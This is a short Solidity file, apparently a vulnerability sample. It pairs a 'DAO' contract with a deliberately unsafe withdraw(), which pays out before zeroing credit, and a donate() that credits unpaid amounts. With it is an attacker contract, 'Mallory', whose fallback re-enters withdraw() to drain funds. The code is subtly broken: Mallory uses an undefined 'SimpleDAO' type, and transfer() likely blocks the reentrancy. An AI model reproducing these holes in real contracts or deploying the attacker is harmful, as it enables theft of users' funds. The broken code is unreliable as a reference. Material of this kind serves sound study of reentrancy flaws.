1 pragma solidity >=0.4.24<0.6.0;
2 
3 contract DAO {
4     mapping (address => uint) public credit;
5     constructor() public {
6     }
7     function donate(address to, uint amount) payable public {
8         credit[to] += amount;
9     }
10     function queryCredit(address to) public view returns (uint) {
11         return credit[to];
12     }
13     function withdraw() public {
14         uint oldBal = address(this).balance; 
15         address payable sender = msg.sender;
16         uint balSender = msg.sender.balance; 
17         uint amount = credit[msg.sender];
18         if (amount > 0) {
19             sender.transfer(amount); 
20             credit[msg.sender] = 0;  
21         }
22         uint bal = address(this).balance;       
23     }
24 }
25 
26 contract Mallory {
27     SimpleDAO public dao;
28     uint count;
29     constructor (address daoAddr) public payable {
30         count = 0;
31         dao = SimpleDAO(daoAddr);
32     }
33     function () payable external {
34         if (count < 2) {
35             count ++;
36             dao.withdraw();
37         }
38     }
39     function donate() public {        
40         dao.donate(address(this), address(this).balance);  
41     }
42     function getJackpot() public {
43         dao.withdraw();
44     }
45 }  